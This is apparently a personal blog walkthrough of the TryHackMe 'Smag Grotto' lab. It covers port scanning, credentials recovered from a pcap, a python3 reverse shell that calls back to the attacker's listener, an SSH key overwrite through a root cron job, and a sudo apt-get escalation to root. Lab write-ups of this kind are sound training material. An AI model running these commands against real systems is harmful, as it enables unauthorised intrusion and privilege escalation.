---
title: Walkthrough - Smag Grotto
published: true
---

Wireshark. Follow the yellow brick road.

[https://tryhackme.com/room/smaggrotto](https://tryhackme.com/room/smaggrotto)

* * *

## Deploy the machine and get root privileges.

- ``sudo nmap -Pn -sS -p- -T4 10.10.211.183 -vvv``

```
PORT   STATE SERVICE REASON                                                         
22/tcp open  ssh     syn-ack ttl 61                                                 
80/tcp open  http    syn-ack ttl 61   
```

- ``sudo nmap -sV -sT -sC -p22,80 10.10.211.183``

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http?
|_http-title: Smag
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- ``gobuster dir -u http://10.10.211.183 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 250 -x txt --no-error``

```
/mail                 (Status: 301) [Size: 313] [--> http://10.10.211.183/mail/]
```

Checking out ``/mail/`` leads us to a page about network migration with a pcap file with 1 TCP stream. Also a comment with a possible username hint? ``<!-- <a>Bcc: trodd@smag.thm</a> -->``

```
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0wHTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

After setting up ``development.smag.thm`` in the hosts file visit the site and follow the attackers steps. Logging in with helpdesk:cH4nG3M3_n0w we are elft at a command page.

It executes commands but doesnt show the execution. 

1. Setup netcat on kali ``rlwrap nc -lvnp 6666``
2. execute python3 reverse shell ``python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.127.225",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'``
3. ``python3 -c 'import pty;pty.spawn("/bin/bash")'``

* * * 

## What is the user flag?

``jake:x:1000:1000:jake,,,:/home/jake:/bin/bash``

We need to get to jake.

- ``cat /etc/crontab`` 

```
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

We can generate a new key on our machine and have it overwrite jakes key.

- ``ssh-keygen -f 0xskar`` and then move the public to overwrite jakes key
- ``echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDsdrf9uvgyZ3p875pK49g18bYvHFstSo09boT/9hszuygKjwHzuN4nXvTun6vDl8qESwMuydd+gmThCja4qtWtlVxHEOuZc7qYa6DbIradT7D8MZfxH0XT1L7j20HU0iox2dAE0OnSG7zD02Vww21Dti/K5G0PlhzzJ2jhjxC6N+uiVH+dcSTZ6K98OnbPxjeD2J5e/w/oyFMTPeqSe/ZU2eyyV+NnsfsTJlGHo+4vIaEyfiAY7IXrjhwjLNrXmoxWFN4l0p4fO8dGw5/KdDc+jj05nJLQZaNeAvXImh+AI+kUUdwBF40d57GXyc6RI2LJOqSiWhqfJg3YAVx73w+LPhlakryHEWgqnH7N1dzhhcXl2xPJaWzgjeKpC7apaEgOF3n6z4+83IDMj4kw/mzLrM7zj3SKeUgKiKGpzafCu2KmSKQzLPmgG0sF5QpWR7JrT9ZY4/D5gK3O8PJaxG5Y7tu9HdCUZKVqoAkJFll8qYww0tz1mlx69sLrzPTVy3s= 0xskar@cocokali" > /opt/.backups/jake_id_rsa.pub.backup``
- and ssh in ``ssh jake@10.10.197.41 -i 0xskar``

![0xskar](/assets/smag-grotto01.png)

* * * 

## What is the root flag?

```
User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

``sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh``

![0xskar](/assets/smag-grotto02.png)

* * * 

